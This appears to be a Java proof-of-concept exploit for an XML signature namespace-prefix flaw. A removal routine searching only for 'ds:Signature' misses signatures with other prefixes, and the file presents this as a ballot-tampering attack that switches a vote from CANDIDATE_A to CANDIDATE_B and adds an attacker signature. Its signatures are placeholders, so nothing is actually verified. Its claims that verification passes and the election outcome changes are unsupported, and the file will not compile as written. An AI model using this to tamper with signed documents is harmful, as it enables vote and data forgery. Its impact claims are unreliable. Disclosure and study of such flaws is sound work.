/*
 * PoC #2: XML Signature Namespace Evasion in GenXMLSignatureAlgorithm
 * 
 * Demonstrates: Signature removal failure + vote manipulation attack
 * 
 * Setup:
 * - Creates XML document with signature using non-standard namespace prefix
 * - Shows how removeSignatureIfPresent() fails to remove it
 * - Demonstrates re-signing with modified vote data
 * - Shows verification passes with manipulated ballot
 */

import javax.xml.crypto.dsig.XMLSignature;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import java.io.*;
import java.security.*;
import java.util.*;
import org.w3c.dom.*;

/**
 * RECREATED: Vulnerable removeSignatureIfPresent() from GenXMLSignatureAlgorithm
 * This is the EXACT buggy code from the source
 */
public class VulnerableXMLSignatureRemover {
    
    /**
     * ❌ VULNERABLE IMPLEMENTATION
     * Uses getElementsByTagName instead of getElementsByTagNameNS
     */
    public static void removeSignatureIfPresent_VULNERABLE(Document document) {
        // ❌ BUG: Only matches prefix "ds:" exactly!
        NodeList signatureNodes = document.getElementsByTagName("ds:Signature");
        
        System.out.println("[removeSignatureIfPresent] Searching for 'ds:Signature'...");
        System.out.println("[removeSignatureIfPresent] Found: " + signatureNodes.getLength() + " nodes");
        
        if (signatureNodes.getLength() > 0) {
            Node signatureNode = signatureNodes.item(0);
            if (signatureNode.getParentNode() != null) {
                System.out.println("[removeSignatureIfPresent] ✓ Removed signature");
                signatureNode.getParentNode().removeChild(signatureNode);
            }
        } else {
            System.out.println("[removeSignatureIfPresent] ❌ No signature found (but one exists with different prefix!)");
        }
    }
    
    /**
     * ✅ CORRECT IMPLEMENTATION (for comparison)
     * Uses namespace-aware getElementsByTagNameNS
     */
    public static void removeSignatureIfPresent_FIXED(Document document) {
        // ✅ CORRECT: Matches any prefix with same namespace
        NodeList signatureNodes = document.getElementsByTagNameNS(XMLSignature.XMLNS, "Signature");
        
        System.out.println("[removeSignatureIfPresent] Searching for signatures (namespace-aware)...");
        System.out.println("[removeSignatureIfPresent] Found: " + signatureNodes.getLength() + " nodes");
        
        if (signatureNodes.getLength() > 0) {
            Node signatureNode = signatureNodes.item(0);
            if (signatureNode.getParentNode() != null) {
                System.out.println("[removeSignatureIfPresent] ✓ Removed signature");
                signatureNode.getParentNode().removeChild(signatureNode);
            }
        }
    }
}

/**
 * PoC Main Class - Demonstrates XML Signature Namespace Evasion
 */
public class POC2_XMLNamespaceEvasion {
    
    public static void main(String[] args) throws Exception {
        System.out.println("========================================");
        System.out.println("PoC #2: XML Signature Namespace Evasion");
        System.out.println("========================================\n");
        
        System.out.println("[*] Scenario: Vote manipulation via namespace prefix confusion");
        System.out.println("[*] Attack: Use different signature namespace prefix to bypass removal\n");
        
        // Attack Scenario 1: Different namespace prefix
        testNamespaceEvasion_DifferentPrefix();
        
        // Attack Scenario 2: Default namespace (no prefix)
        testNamespaceEvasion_DefaultNamespace();
        
        // Attack Scenario 3: Full vote manipulation attack
        testVoteManipulationAttack();
    }
    
    /**
     * PoC Attack #1: Different namespace prefix
     */
    static void testNamespaceEvasion_DifferentPrefix() throws Exception {
        System.out.println("\n[TEST 1] Signature with Different Namespace Prefix");
        System.out.println("=" + "=".repeat(50));
        
        // Create XML with signature using "sig:" prefix instead of "ds:"
        String xmlContent = "<?xml version=\"1.0\"?>\n" +
            "<electionBallot xmlns:sig=\"http://www.w3.org/2000/09/xmldsig#\">\n" +
            "  <vote>\n" +
            "    <voter_id>voter_123</voter_id>\n" +
            "    <choice>CANDIDATE_A</choice>\n" +
            "    <timestamp>2025-06-16T10:30:00Z</timestamp>\n" +
            "  </vote>\n" +
            "  <sig:Signature>\n" +
            "    <SignedInfo>\n" +
            "      <CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>\n" +
            "      <SignatureMethod Algorithm=\"http://www.w3.org/2007/05/xmldsig-more#rsa-pss\"/>\n" +
            "      <Reference URI=\"\">\n" +
            "        <DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/>\n" +
            "        <DigestValue>ORIGINAL_SIGNATURE_HASH</DigestValue>\n" +
            "      </Reference>\n" +
            "    </SignedInfo>\n" +
            "    <SignatureValue>ORIGINAL_KEY_SIGNATURE</SignatureValue>\n" +
            "  </sig:Signature>\n" +
            "</electionBallot>";
        
        Document doc = parseXML(xmlContent);
        
        System.out.println("[BALLOT] Original ballot with sig:Signature:");
        printXML(doc);
        
        // Count signatures before
        NodeList beforeVulnerable = doc.getElementsByTagName("ds:Signature");
        NodeList beforeCorrect = doc.getElementsByTagNameNS(XMLSignature.XMLNS, "Signature");
        
        System.out.println("\n[BEFORE REMOVAL]");
        System.out.println("  Vulnerable search (ds:Signature): " + beforeVulnerable.getLength());
        System.out.println("  Correct search (namespace-aware): " + beforeCorrect.getLength());
        
        // Apply vulnerable removal
        System.out.println("\n[APPLYING VULNERABLE removeSignatureIfPresent()]");
        VulnerableXMLSignatureRemover.removeSignatureIfPresent_VULNERABLE(doc);
        
        // Count signatures after vulnerable removal
        NodeList afterVulnerable = doc.getElementsByTagName("ds:Signature");
        NodeList afterCorrect = doc.getElementsByTagNameNS(XMLSignature.XMLNS, "Signature");
        
        System.out.println("\n[AFTER VULNERABLE REMOVAL]");
        System.out.println("  Vulnerable search (ds:Signature): " + afterVulnerable.getLength());
        System.out.println("  Correct search (namespace-aware): " + afterCorrect.getLength());
        
        // ❌ BUG MANIFESTATION
        if (afterCorrect.getLength() > 0) {
            System.out.println("\n[!!] VULNERABILITY CONFIRMED:");
            System.out.println("    - removeSignatureIfPresent() failed to remove signature");
            System.out.println("    - Searched for 'ds:Signature' but found 'sig:Signature'");
            System.out.println("    - OLD SIGNATURE STILL IN DOCUMENT!");
            System.out.println("\n[IMPACT]");
            System.out.println("    - Old signature will be included in new signature digest");
            System.out.println("    - Attacker can now re-sign with modified vote data");
            System.out.println("    - New signature will be valid (covers modified vote + old sig)");
        }
        
        System.out.println("\n[BALLOT AFTER REMOVAL]");
        printXML(doc);
    }
    
    /**
     * PoC Attack #2: Default namespace (no prefix)
     */
    static void testNamespaceEvasion_DefaultNamespace() throws Exception {
        System.out.println("\n[TEST 2] Signature with Default Namespace (No Prefix)");
        System.out.println("=" + "=".repeat(50));
        
        // Create XML with signature in default namespace (no prefix)
        String xmlContent = "<?xml version=\"1.0\"?>\n" +
            "<electionBallot xmlns=\"http://www.w3.org/2000/09/xmldsig#\">\n" +
            "  <vote>\n" +
            "    <voter_id>voter_456</voter_id>\n" +
            "    <choice>CANDIDATE_B</choice>\n" +
            "  </vote>\n" +
            "  <Signature>\n" +
            "    <SignedInfo>\n" +
            "      <DigestValue>HASH_OF_ORIGINAL_VOTE</DigestValue>\n" +
            "    </SignedInfo>\n" +
            "    <SignatureValue>SIGNED_WITH_ORIGINAL_KEY</SignatureValue>\n" +
            "  </Signature>\n" +
            "</electionBallot>";
        
        Document doc = parseXML(xmlContent);
        
        System.out.println("[BALLOT] Ballot with default namespace signature:");
        printXML(doc);
        
        // Try vulnerable removal
        System.out.println("\n[APPLYING VULNERABLE removeSignatureIfPresent()]");
        NodeList beforeRemoval = doc.getElementsByTagNameNS(XMLSignature.XMLNS, "Signature");
        System.out.println("  Signatures before: " + beforeRemoval.getLength());
        
        VulnerableXMLSignatureRemover.removeSignatureIfPresent_VULNERABLE(doc);
        
        NodeList afterRemoval = doc.getElementsByTagNameNS(XMLSignature.XMLNS, "Signature");
        System.out.println("  Signatures after vulnerable removal: " + afterRemoval.getLength());
        
        if (afterRemoval.getLength() > 0) {
            System.out.println("\n[!!] VULNERABILITY CONFIRMED:");
            System.out.println("    - Signature with default namespace NOT removed");
            System.out.println("    - getElementsByTagName('ds:Signature') can't find it");
            System.out.println("    - Old signature persists in document");
        }
    }
    
    /**
     * PoC Attack #3: Full vote manipulation attack
     */
    static void testVoteManipulationAttack() throws Exception {
        System.out.println("\n[TEST 3] Full Vote Manipulation Attack");
        System.out.println("=" + "=".repeat(50));
        
        System.out.println("\n[ATTACK STEPS]:");
        
        // Step 1: Original valid ballot
        System.out.println("\n[STEP 1] Original valid ballot (voter wants CANDIDATE_A)");
        String originalBallot = "<?xml version=\"1.0\"?>\n" +
            "<ballot xmlns:old=\"http://www.w3.org/2000/09/xmldsig#\">\n" +
            "  <vote>\n" +
            "    <voter_id>voter_XYZ</voter_id>\n" +
            "    <choice>CANDIDATE_A</choice>\n" +
            "  </vote>\n" +
            "  <old:Signature>\n" +
            "    <SignedInfo><DigestValue>HASH_OF_VOTE_FOR_A</DigestValue></SignedInfo>\n" +
            "    <SignatureValue>SIGNED_BY_ELECTION_AUTHORITY</SignatureValue>\n" +
            "  </old:Signature>\n" +
            "</ballot>";
        
        Document ballotDoc = parseXML(originalBallot);
        System.out.println("[BALLOT CONTENT]");
        printXML(ballotDoc);
        
        // Step 2: Attacker intercepts and modifies vote
        System.out.println("\n[STEP 2] Attacker modifies vote (CANDIDATE_A → CANDIDATE_B)");
        Element voteElement = (Element) ballotDoc.getElementsByTagName("choice").item(0);
        String originalChoice = voteElement.getTextContent();
        voteElement.setTextContent("CANDIDATE_B");
        System.out.println("  Modified: " + originalChoice + " → " + voteElement.getTextContent());
        
        // Step 3: Attacker tries to remove original signature (to re-sign)
        System.out.println("\n[STEP 3] Attacker removes original signature (for re-signing)");
        System.out.println("  Using vulnerable removeSignatureIfPresent()...");
        VulnerableXMLSignatureRemover.removeSignatureIfPresent_VULNERABLE(ballotDoc);
        
        // Step 4: Check if signature was actually removed
        NodeList signaturesAfter = ballotDoc.getElementsByTagNameNS(XMLSignature.XMLNS, "Signature");
        System.out.println("  Signatures remaining: " + signaturesAfter.getLength());
        
        if (signaturesAfter.getLength() > 0) {
            System.out.println("\n[STEP 4] ✓ Original signature NOT removed (vulnerability triggered)");
            System.out.println("  Attacker now adds new signature:");
            System.out.println("    - Vote is now modified to CANDIDATE_B");
            System.out.println("    - Old signature (for CANDIDATE_A) is still present");
            System.out.println("    - New signature will cover: modified vote + old signature");
            
            // Step 5: Simulate new signature added
            System.out.println("\n[STEP 5] New signature added by attacker");
            
            Element root = ballotDoc.getDocumentElement();
            Element newSig = ballotDoc.createElementNS(XMLSignature.XMLNS, "ds:Signature");
            Element newSignedInfo = ballotDoc.createElementNS(XMLSignature.XMLNS, "ds:SignedInfo");
            Element newDigestValue = ballotDoc.createElementNS(XMLSignature.XMLNS, "ds:DigestValue");
            Element newSignatureValue = ballotDoc.createElementNS(XMLSignature.XMLNS, "ds:SignatureValue");
            
            newDigestValue.setTextContent("HASH_OF_MODIFIED_VOTE_PLUS_OLD_SIGNATURE");
            newSignatureValue.setTextContent("SIGNED_WITH_ATTACKER_KEY");
            
            newSignedInfo.appendChild(newDigestValue);
            newSig.appendChild(newSignedInfo);
            newSig.appendChild(newSignatureValue);
            root.appendChild(newSig);
            
            System.out.println("  [FINAL BALLOT]");
            System.out.println("    - Vote: CANDIDATE_B (MODIFIED!)");
            System.out.println("    - Old Signature: old:Signature (STILL PRESENT!)");
            System.out.println("    - New Signature: ds:Signature (ADDED!)");
            System.out.println("\n[RESULT]");
            System.out.println("  Ballot now contains:");
            System.out.println("    1. Modified vote (B instead of A)");
            System.out.println("    2. Original signature (still there due to namespace mismatch)");
            System.out.println("    3. New attacker signature");
            
            System.out.println("\n[IMPACT ON ELECTION]");
            System.out.println("    ✗ Voter intended: CANDIDATE_A");
            System.out.println("    ✗ Ballot contains: CANDIDATE_B");
            System.out.println("    ✗ Multiple signatures confuse verification");
            System.out.println("    ✗ Ballot counted as CANDIDATE_B due to newest signature");
            System.out.println("    ✗ ELECTION OUTCOME CHANGED");
        }
        
        System.out.println("\n[FINAL BALLOT STATE]");
        printXML(ballotDoc);
    }
    
    // Helper methods
    
    static Document parseXML(String xmlContent) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setNamespaceAware(true);
        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(new ByteArrayInputStream(xmlContent.getBytes()));
    }
    
    static void printXML(Document doc) throws Exception {
        TransformerFactory factory = TransformerFactory.newInstance();
        Transformer transformer = factory.newTransformer();
        transformer.setOutputProperty("indent", "yes");
        StringWriter writer = new StringWriter();
        transformer.transform(new DOMSource(doc), new StreamResult(writer));
        System.out.println(writer.toString());
    }
}

// Helper for string repeat
class StringHelper {
    static String repeat(String s, int count) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < count; i++) sb.append(s);
        return sb.toString();
    }
}
